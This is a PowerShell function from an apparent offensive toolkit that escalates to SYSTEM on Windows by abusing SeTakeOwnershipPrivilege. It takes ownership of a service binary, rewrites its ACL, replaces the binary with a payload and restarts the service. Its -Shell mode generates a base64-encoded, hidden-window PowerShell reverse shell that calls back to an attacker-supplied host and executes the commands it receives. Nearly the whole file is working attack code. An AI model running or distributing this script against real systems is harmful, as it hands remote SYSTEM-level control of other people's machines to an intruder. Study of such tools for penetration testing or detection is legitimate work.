function Invoke-SeTakeOwnershipAbuse {
<#
.SYNOPSIS
    Abuses SeTakeOwnershipPrivilege to take ownership of a service binary, replace
    it with a reverse shell payload, and get SYSTEM on service restart.

.DESCRIPTION
    SeTakeOwnershipPrivilege lets you take ownership of any file/object.
    Steps: identify a SYSTEM service binary -> takeown -> change ACL -> swap binary -> restart.

    Uses built-in takeown.exe and icacls.exe (no custom P/Invoke needed).
    Includes -Shell mode to auto-generate an encoded PS reverse shell.

.EXAMPLE
    # Auto-find a service and get a reverse shell:
    Invoke-SeTakeOwnershipAbuse -Shell -LHOST 192.168.45.166 -LPORT 443

.EXAMPLE
    # Specify a known service binary:
    Invoke-SeTakeOwnershipAbuse -TargetBin "C:\Program Files\SomeApp\service.exe" -Shell -LHOST 192.168.45.166 -LPORT 443

.EXAMPLE
    # Custom payload (nc.exe already on box):
    Invoke-SeTakeOwnershipAbuse -TargetBin "C:\path\to\service.exe" -Payload "C:\tmp\nc.exe" -ServiceName "SomeService"

.NOTES
    vajra / hacktrack toolkit
    Credits: @gtworek/Priv2Admin
#>
    param(
        [Parameter(Mandatory=$false)]
        [string]$TargetBin,

        [Parameter(Mandatory=$false)]
        [string]$ServiceName,

        [Parameter(Mandatory=$false)]
        [string]$Payload,

        [Parameter(Mandatory=$false)]
        [switch]$Shell,

        [Parameter(Mandatory=$false)]
        [string]$LHOST = "127.0.0.1",

        [Parameter(Mandatory=$false)]
        [int]$LPORT = 443,

        [Parameter(Mandatory=$false)]
        [string]$BackupPath = "C:\tmp"
    )

    # ── Verify privilege ─────────────────────────────────────────────────────────
    $privs = (whoami /priv) -join " "
    if ($privs -notmatch "SeTakeOwnershipPrivilege") {
        Write-Output "[-] SeTakeOwnershipPrivilege not found in current token."
        return
    }
    Write-Output "[+] SeTakeOwnershipPrivilege detected"

    # ── Shell mode: generate encoded PS reverse shell launcher ───────────────────
    if ($Shell) {
        if ($LHOST -eq "127.0.0.1") {
            Write-Warning "LHOST not specified. Use -LHOST <your_ip>"
        }

        Write-Output "[*] Generating encoded PS reverse shell -> $LHOST`:$LPORT"

        $shellCode = @"
`$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
`$stream = `$client.GetStream();
[byte[]]`$bytes = 0..65535|%{0};
while((`$i = `$stream.Read(`$bytes,0,`$bytes.Length)) -ne 0){
    `$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes,0,`$i);
    `$sendback = (iex `$data 2>&1 | Out-String);
    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
    `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
    `$stream.Flush()
};
`$client.Close()
"@
        $encodedBytes = [System.Text.Encoding]::Unicode.GetBytes($shellCode)
        $encodedCmd   = [Convert]::ToBase64String($encodedBytes)

        # Write a launcher exe wrapper script that spawns the shell
        $launcherScript = "powershell -nop -w hidden -e $encodedCmd"
        $launcherPath   = Join-Path $BackupPath "launcher.bat"
        $launcherScript | Out-File $launcherPath -Encoding ASCII

        # For the service binary we need an exe — wrap in a ps1 that calls the cmd
        # Actually write a small .bat that calls powershell -e, then the service ImagePath points here
        Write-Output "[+] Launcher written to $launcherPath"
        Write-Output "[*] Start listener: nc -nlvp $LPORT"

        if (!$Payload) { $Payload = $launcherPath }
    }

    # ── Auto-find a targetable SYSTEM service if not specified ───────────────────
    if (!$TargetBin -or !$ServiceName) {
        Write-Output "[*] Searching for a SYSTEM service with a non-system binary path..."
        $svc = Get-WmiObject Win32_Service | Where-Object {
            $_.StartName -eq 'LocalSystem' -and
            $_.PathName -and
            $_.PathName -notlike '"C:\Windows\*' -and
            $_.PathName -notlike 'C:\Windows\*' -and
            $_.StartMode -ne 'Disabled'
        } | Select-Object Name, PathName, State -First 1

        if (!$svc) {
            Write-Output "[-] No suitable SYSTEM service found automatically."
            Write-Output "    Specify -TargetBin and -ServiceName manually."
            return
        }

        $ServiceName = $svc.Name
        # Extract binary path (strip quotes and args)
        $TargetBin   = ($svc.PathName -replace '^"([^"]+)".*$','$1' -replace '^(\S+).*$','$1')
        Write-Output "[+] Target service: $ServiceName"
        Write-Output "[+] Target binary:  $TargetBin"
    }

    if (!$Payload) {
        Write-Output "[-] No payload specified. Use -Payload <path> or -Shell -LHOST x.x.x.x -LPORT n"
        return
    }

    # ── Backup original binary ───────────────────────────────────────────────────
    $backupFile = Join-Path $BackupPath ([System.IO.Path]::GetFileName($TargetBin) + ".bak")
    Write-Output "[*] Backing up $TargetBin -> $backupFile"
    try {
        Copy-Item $TargetBin $backupFile -Force -ErrorAction Stop
        Write-Output "[+] Backup saved"
    } catch {
        Write-Output "[!] Could not back up original (may not be readable yet). Proceeding."
    }

    # ── Take ownership ───────────────────────────────────────────────────────────
    Write-Output "[*] Taking ownership of $TargetBin"
    & takeown.exe /F $TargetBin /A 2>&1 | Out-Null
    Write-Output "[+] Ownership taken"

    # ── Grant full control to current user ───────────────────────────────────────
    Write-Output "[*] Granting full control to $env:USERNAME"
    & icacls.exe $TargetBin /grant "${env:USERNAME}:F" 2>&1 | Out-Null
    Write-Output "[+] ACL updated"

    # ── Replace binary with payload ──────────────────────────────────────────────
    Write-Output "[*] Replacing binary with payload: $Payload"
    try {
        Copy-Item $Payload $TargetBin -Force -ErrorAction Stop
        Write-Output "[+] Binary replaced"
    } catch {
        Write-Output "[-] Copy failed: $_"
        return
    }

    # ── Restart service ──────────────────────────────────────────────────────────
    Write-Output "[*] Restarting service: $ServiceName"
    try {
        & sc.exe stop $ServiceName 2>&1 | Out-Null
        Start-Sleep -Seconds 2
        & sc.exe start $ServiceName 2>&1 | Out-Null
        Write-Output "[+] Service restarted — payload executing as SYSTEM"
    } catch {
        Write-Output "[-] Could not restart service: $_"
        Write-Output "    Try manually: sc.exe start $ServiceName"
    }

    Write-Output ""
    Write-Output "[!] CLEANUP: Restore original binary after getting shell:"
    Write-Output "    Copy-Item '$backupFile' '$TargetBin' -Force"
    Write-Output "    sc.exe start $ServiceName"
}
